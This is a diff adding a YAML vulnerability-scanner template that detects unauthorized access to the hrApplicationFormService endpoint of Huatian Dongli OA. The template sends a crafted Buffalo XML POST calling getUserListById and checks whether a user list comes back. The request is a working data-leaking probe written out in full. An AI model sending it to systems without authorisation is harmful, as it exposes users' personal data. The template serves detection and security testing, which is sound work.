@@ -1,0 +1,40 @@
+id: huatiandongli-hrapplicationformservice-unauthorized-access
+info:
+  name: Unauthorized Access Vulnerability in 华天动力OA hrApplicationFormService
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: access-control,unauthorized
+  description: |
+    This template detects an unauthorized access vulnerability in 华天动力OA hrApplicationFormService where sensitive data can be accessed without proper authorization.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/OAapp/bfapp/buffalo/hrApplicationFormService"
+    headers:
+      Content-Type: text/xml;charset=utf-8
+    body: |-
+      <buffalo-call>
+      <method>getUserListById</method>
+      <boolean>1</boolean>
+      <string></string>
+      <string>2</string>
+      <string></string>
+      <string></string>
+      <boolean>1</boolean>
+      <boolean>1</boolean>
+      </buffalo-call>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<type>java.util.HashMap</type>"
+          - "<type>java.util.ArrayList</type>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
